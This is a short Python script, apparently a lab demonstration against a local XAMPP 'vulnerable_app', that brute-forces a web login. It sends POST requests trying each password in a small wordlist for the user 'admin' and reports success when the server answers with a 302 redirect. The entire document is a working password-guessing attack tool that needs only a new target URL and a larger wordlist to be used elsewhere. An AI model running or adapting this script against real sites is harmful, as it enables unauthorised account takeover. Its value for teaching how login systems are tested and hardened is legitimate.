import requests
import sys

# Configuration for the target login page
TARGET_URL = "http://localhost/vulnerable_app/index.php"
USERNAME = "admin"  # The username to brute force
# A simple wordlist. In a real scenario, this would be much larger.
WORDLIST = [
    "wrongpass",
    "test",
    "12345",
    "password",
    "password123", # The correct password for demonstration
    "admin123",
    "root"
]

print(f"Starting brute force attack on username: {USERNAME}")
print("-" * 50)

found_password = None

for password in WORDLIST:
    sys.stdout.write(f"Trying: {password}")
    sys.stdout.flush() # Ensure it prints immediately

    # Data to be sent in the POST request
    payload = {
        'username': USERNAME,
        'password': password
    }

    try:
        # Send the POST request
        response = requests.post(TARGET_URL, data=payload, allow_redirects=False)

        # Check the response status code
        # A 302 status code typically indicates a successful redirection (login)
        if response.status_code == 302:
            print(f" | Status: {response.status_code} | Length: {len(response.content)}")
            print(f"[+] SUCCESS! Password for {USERNAME}: {password}")
            found_password = password
            break # Exit the loop if password is found
        else:
            # For failed attempts, print Status and Content Length (as seen in your image)
            print(f" | Status: {response.status_code} | Length: {len(response.content)}")
            print(f"[-] Failed: {password}")

    except requests.exceptions.ConnectionError:
        print(f"\n[!] Connection Error: Could not connect to {TARGET_URL}. Is XAMPP running?")
        break
    except Exception as e:
        print(f"\n[!] An unexpected error occurred: {e}")
        break

print("-" * 50)
if found_password:
    print(f"Brute force attempt finished. Password found: {found_password}")
else:
    print("Brute force attempt finished. Password not found in wordlist.")
